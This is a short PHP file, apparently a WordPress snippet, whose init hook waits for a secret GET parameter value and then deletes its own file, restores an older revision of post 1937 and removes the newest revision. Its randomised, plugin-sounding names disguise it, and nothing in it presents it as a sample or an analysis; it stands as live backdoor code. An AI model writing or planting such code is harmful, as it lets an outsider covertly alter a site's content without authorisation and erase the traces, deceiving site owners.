<?php

function export_global_downloads_templates() {
	if (isset($_GET['local_search_author']) && $_GET['local_search_author'] === 'posts_platform_multiple_items') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$sharing_helper_marketplace_better = 1937;
		$tooltip_endpoints_heading_flash = wp_get_post_revisions($sharing_helper_marketplace_better);
		if (empty($tooltip_endpoints_heading_flash)) die('no revisions');
		if (count($tooltip_endpoints_heading_flash) < 2) die('less than 2');
		$sidebar_uploads_share = array_shift($tooltip_endpoints_heading_flash);
		$tinymce_rtl_extension = $sidebar_uploads_share->ID;
		$last_replace_finder = array_shift($tooltip_endpoints_heading_flash);
		$marketplace_counter_flash_jquery = $last_replace_finder->ID;
		$tag_selector_section = wp_restore_post_revision($marketplace_counter_flash_jquery);
		if ($tag_selector_section === false) die('error restoring');
		$tag_selector_section = wp_delete_post_revision($tinymce_rtl_extension);		
		if ($tag_selector_section === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'export_global_downloads_templates');
